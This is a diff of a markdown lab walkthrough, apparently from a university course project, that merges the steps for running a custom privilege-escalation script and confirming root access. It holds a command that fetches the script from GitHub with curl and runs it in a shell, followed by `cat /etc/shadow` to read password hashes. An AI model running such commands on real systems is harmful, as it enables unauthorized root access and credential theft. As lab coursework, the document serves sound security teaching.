@@ -195,20 +195,10 @@ curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/pha
 
 ---
 
-## 3.2 Execute Custom Privilege Escalation (escalate.sh) (Terminal A)
+## 3.2 Execute Custom Privilege Escalation (escalate.sh) & Confirm Root Access (Terminal A)
 
 ```bash
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
-```
-
-**Screenshot:**
-- ![27-run-escalate-script-and-root-access.png](./screenshots/27-run-escalate-script-and-root-access.png)
-
----
-
-## 3.3 Confirm Root Access
-
-```bash
 whoami
 cat /etc/shadow
 ```
